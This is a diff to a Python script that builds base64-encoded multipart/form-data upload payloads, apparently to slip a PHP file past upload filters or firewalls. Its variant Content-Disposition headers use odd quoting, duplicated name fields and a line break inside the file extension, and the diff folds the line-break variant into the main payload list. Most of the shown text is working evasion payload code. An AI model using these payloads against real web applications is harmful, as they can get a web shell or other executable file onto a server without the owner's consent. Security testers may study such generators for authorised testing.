@@ -37,25 +37,13 @@ def generate(Content_Type1 = b'''Content-Type: multipart/form-data; boundary='''
 
     return base64.b64encode(body)
 
-def generate_suffix_newline(file_suffix = b'php'):
-
-    body = b'''Content-Type: multipart/form-data; boundary=''' + boundary + b'''\r
-\r
---''' + boundary + b'''\r
-Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix[:1] + b'''\r\n''' + suffix[1:] + b'''"\r
-Content-Type: ''' + Content_Type + b'''\r
-\r
-''' + content + b'''\r
---''' + boundary
-    
-    return base64.b64encode(body)
-
 def generate_other(body = b''):
     
     return base64.b64encode(body)
 ##################################################################################################
 payloads = []
-Content_Disposition_list = [b'''Content-Disposition: "form-data"; name=\'''' + name + b'''; filename=\'''' + filename + b'''.''' + suffix + b'''; name=\'''' + name + b'''\'''',
+Content_Disposition_list = [b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix[:1] + b'''\r\n''' + suffix[1:] + b'''"''',
+b'''Content-Disposition: "form-data"; name=\'''' + name + b'''; filename=\'''' + filename + b'''.''' + suffix + b'''; name=\'''' + name + b'''\'''',
 b'''Content-Disposition: "form-data"; name="''' + name + b'''\\"; filename="''' + filename + b'''.''' + suffix + b'''; name="''' + name + b'''"''',
 b'''Content-Disposition: "form-data"; name="''' + name + b'''"a"; filename="''' + filename + b'''.''' + suffix + b'''"''',
 b'''Content-Disposition: "form-data"; name="''' + name + b'''"; filename=''' + filename + b''''.''' + suffix,
@@ -225,8 +213,6 @@ for i in Content_Type2_list:
 
 for i in other_list:
     payloads.append(generate_other(body = i))
-
-payloads.append(generate_suffix_newline(file_suffix = suffix))
 
 payloads_string = ''
 for i in payloads:
